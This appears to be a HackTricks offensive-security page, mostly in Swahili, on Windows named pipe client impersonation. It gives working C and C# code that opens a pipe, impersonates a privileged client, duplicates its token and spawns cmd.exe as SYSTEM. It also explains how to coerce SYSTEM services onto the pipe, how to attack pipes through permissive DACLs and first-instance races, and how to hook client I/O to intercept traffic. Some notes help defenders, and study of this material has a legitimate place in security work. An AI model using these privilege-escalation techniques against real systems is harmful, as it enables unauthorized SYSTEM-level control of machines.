# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ni primitive ya local privilege escalation inayoruhusu thread ya named-pipe server kuchukua security context ya client inayounganisha nayo. Kwa vitendo, attacker anayeweza kuendesha code akiwa na SeImpersonatePrivilege anaweza kulazimisha client mwenye privileges za juu (kwa mfano, service ya SYSTEM) iunganishe kwenye pipe inayodhibitiwa na attacker, kuita ImpersonateNamedPipeClient, ku-duplicate token inayopatikana kuwa primary token, na kuanzisha process kama client (mara nyingi NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Ukurasa huu unaangazia technique ya msingi. Kwa exploit chains kamili zinazolazimisha SYSTEM kuunganisha kwenye pipe yako, tazama kurasa za familia ya Potato zilizorejelewa hapa chini.

## TL;DR
- Tengeneza named pipe: \\.\pipe\<random> na usubiri connection.
- Fanya component yenye privileges za juu iunganishe nayo (spooler/DCOM/EFSRPC/etc.).
- Soma angalau message moja kutoka kwenye pipe, kisha ita ImpersonateNamedPipeClient.
- Fungua impersonation token kutoka kwenye thread ya sasa, tumia DuplicateTokenEx(TokenPrimary), na CreateProcessWithTokenW/CreateProcessAsUser ili kupata process ya SYSTEM.<sup>[[2]](#references)</sup>

## Requirements and key APIs
- Privileges zinazohitajika kwa kawaida na calling process/thread:
- SeImpersonatePrivilege ili ku-impersonate client anayeunganisha kwa mafanikio na kutumia CreateProcessWithTokenW.
- Vinginevyo, baada ya ku-impersonate SYSTEM, unaweza kutumia CreateProcessAsUser, ambayo inaweza kuhitaji SeAssignPrimaryTokenPrivilege na SeIncreaseQuotaPrivilege (hizi hutimizwa unapokuwa una-impersonate SYSTEM).
- Core APIs zinazotumika:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (lazima usome angalau message moja kabla ya impersonation)
- ImpersonateNamedPipeClient na RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW au CreateProcessAsUser
- Impersonation level: ili kutekeleza actions zenye manufaa locally, client lazima iruhusu SecurityImpersonation (default kwa local RPC/named-pipe clients wengi). Clients zinaweza kupunguza kiwango hiki kwa kutumia SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION wakati wa kufungua pipe.<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Maelezo:
- Ikiwa ImpersonateNamedPipeClient itarejesha ERROR_CANNOT_IMPERSONATE (1368), hakikisha unasoma kutoka kwenye pipe kwanza na kwamba client haikuzuia impersonation hadi kiwango cha Identification.
- Pendelea DuplicateTokenEx yenye SecurityImpersonation na TokenPrimary ili kuunda primary token inayofaa kwa kuunda process.

## Mfano wa haraka wa .NET
Katika .NET, NamedPipeServerStream inaweza kufanya impersonate kupitia RunAsClient. Baada ya kufanya impersonate, duplicate thread token na uunde process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Vichochezi/coercions za kawaida za kupata SYSTEM kwenye pipe yako
Techniques hizi hulazimisha services zenye privileges kuunganishwa kwenye named pipe yako ili uweze kuzi-impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Angalia matumizi ya kina na compatibility hapa:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ikiwa unahitaji tu mfano kamili wa kutengeneza pipe na ku-impersonate ili ku-spawn SYSTEM kutoka kwenye service trigger, angalia:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Wakati service yenye privileges na process yenye privileges ndogo zinapowasiliana kupitia `\\.\pipe\...`, ichukulie pipe kama boundary nyingine yoyote ya IPC isiyoaminika. Mbali na server-side impersonation ya kawaida, pipe ACLs dhaifu, creation flags zisizo salama, na maamuzi ya trust ya upande wa client vinaweza pia kuwa primitives za local privilege escalation.<sup>[[7]](#references)</sup>

### Anza kwa ku-enumerate pipes zinazoweza kutumika
- Orodhesha pipes haraka kutoka PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` ni muhimu kutambua idadi ya instances na pipes zenye instance moja.
- Weka kipaumbele kwa majina yanayotumiwa na services zinazoendesha kama `SYSTEM`, hasa helpers, updaters, launchers, na UI brokers.

### MITM kupitia DACLs zinazoruhusu access na pipe instances za ziada
- Process yoyote inayoweza kuwasiliana na server yenye privileges inaweza tayari ku-fuzz protocol yake na kutafuta privileged verbs.<sup>[[7]](#references)</sup>
- Hali ya kuvutia zaidi ni wakati DACL inatoa `FILE_GENERIC_WRITE`/`GENERIC_WRITE` kwenye pipe object. Kwenye named pipes, hii inajumuisha kwa njia isiyo ya moja kwa moja `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` inashiriki bit hiyo hiyo), hivyo attacker anaweza kuunda server instance nyingine yenye jina lilelile.
- Kwa sababu instances hupangwa kwa FIFO, instances zilizoundwa na attacker na zile halali zinaweza kuchanganywa: tengeneza rogue instance kwa `CreateNamedPipe`, kisha fungua pipe name hiyo hiyo kwa `CreateFile`, na usubiri client halisi iunganishwe kwenye rogue server instance.
- Matokeo: tazama, badilisha, relay, au vuruga privileged IPC bila kuhitaji kumiliki original server process.

### First-instance race kwenye pipe security descriptors
- `lpSecurityAttributes` hufafanua DACL pekee wakati instance ya kwanza ya pipe name inapoundwa.<sup>[[4]](#references)[[7]](#references)</sup>
- Ikiwa service yenye privileges inaanza baadaye na haitumii `FILE_FLAG_FIRST_PIPE_INSTANCE`, attacker anaweza kuunda pipe name mapema ikiwa na DACL inayoruhusu access, kisha aache service iunde instances za baadaye chini ya security context iliyochaguliwa na attacker.
- Hii hugeuza service startup kuwa race condition: shinda instance ya kwanza, kisha uunganishe au ufanye MITM kwa clients wa baadaye ukitumia ACL iliyodhoofishwa.
- Mitigation kwa defenders, na pointi muhimu ya review kwa attackers: angalia ikiwa `CreateNamedPipe(..., dwOpenMode, ...)` inajumuisha `FILE_FLAG_FIRST_PIPE_INSTANCE`. Ikiwa haijumuishi, jaribu kuunda pipe mapema kabla service haijaanza.

### PID/signature checks ni hardening, si boundary
- Baadhi ya products hujaribu kuzuia access kwa kuangalia `GetNamedPipeClientProcessId`, process image path, au Authenticode signer wa client anayeunganisha.<sup>[[7]](#references)</sup>
- Hii husaidia tu hadi u-inject kwenye client halali: ukiwa ndani ya trusted process, unarithi PID/image/signature context halisi ambayo server inatarajia.
- Kwa split desktop apps, ku-instrument low-privileged UI/helper process mara nyingi ni rahisi kuliko kushambulia `SYSTEM` service moja kwa moja.

### Hook client kulingana na I/O model yake
- Synchronous I/O: intercept `NtWriteFile` kabla syscall haijatumia buffer, na inspect/patch `NtReadFile` baada ya kurudi.<sup>[[7]](#references)</sup>
- Overlapped I/O: hifadhi `OVERLAPPED`/`IoStatusBlock` iliyoonekana kwenye `NtReadFile`, kisha inspect buffer baada ya `GetOverlappedResult` au wait inayohusika kukamilika.
- Completion ports: `GetQueuedCompletionStatus` hufikia `NtRemoveIoCompletion`; `ApcContext` inayorejeshwa inaunganisha na `OVERLAPPED` iliyotumiwa na read ya awali, ambayo ndiyo pivot sahihi ya kupata buffer iliyojaa data sasa.
- Completion routines (`ReadFileEx`): completion callback hutumwa kama APC. Ikiwa unataka ku-tamper data iliyorejeshwa au ku-inject synthetic replies, hook real completion routine na, kwa custom injection, tumia one-argument `QueueUserAPC` dispatcher inayounda upya arguments 3 zinazotarajiwa na routine.<sup>[[5]](#references)[[7]](#references)</sup>

### Maelezo ya tooling
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) hu-proxy named-pipe traffic kupitia injected helper DLL na hutoa workflow inayofanana na Burp kwa editing/replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) hutumia approach ya Frida na inalenga ku-hook `NtReadFile`/`NtWriteFile` pamoja na async/completion pivots zilizo hapo juu, kisha ku-forward traffic kwenye editing workflow inayotumia WebSocket.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Mambo ya kuzingatia kiutendaji
- Named pipes zina latency ndogo; kusitisha kwa muda mrefu wakati wa kuhariri buffers kunaweza kusababisha services dhaifu kuingia kwenye deadlock.<sup>[[7]](#references)</sup>
- Clients zinazoendeshwa na Overlapped/completion-port/APC zinahitaji hooks tofauti na detours rahisi za `ReadFile`/`WriteFile`.
- Injection kwenye trusted client huwa noisy, na kwa kawaida inafaa kutumika tu katika exploit development, protocol reversing, au local lab fuzzing.

## Utatuzi wa matatizo na mambo ya kuzingatia
- Lazima usome angalau message moja kutoka kwenye pipe kabla ya kuita ImpersonateNamedPipeClient; vinginevyo utapata ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Ikiwa client inaunganika kwa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server haiwezi kufanya impersonation kamili; kagua impersonation level ya token kupitia GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW inahitaji SeImpersonatePrivilege kwenye caller. Ikiwa hilo litashindikana kwa ERROR_PRIVILEGE_NOT_HELD (1314), tumia CreateProcessAsUser baada ya kufanya impersonate SYSTEM.
- Hakikisha security descriptor ya pipe yako inaruhusu target service kuunganika ikiwa unaifanya iwe hardened; kwa chaguo-msingi, pipes zilizo chini ya \\.\pipe zinapatikana kulingana na DACL ya server.<sup>[[3]](#references)</sup>

## Marejeo

- [1] [Windows: Nyaraka za ImpersonateNamedPipeClient](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Usalama wa Named Pipe na Haki za Ufikiaji](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server kwa Kutumia Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap - zana ya Windows named pipe proxy](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
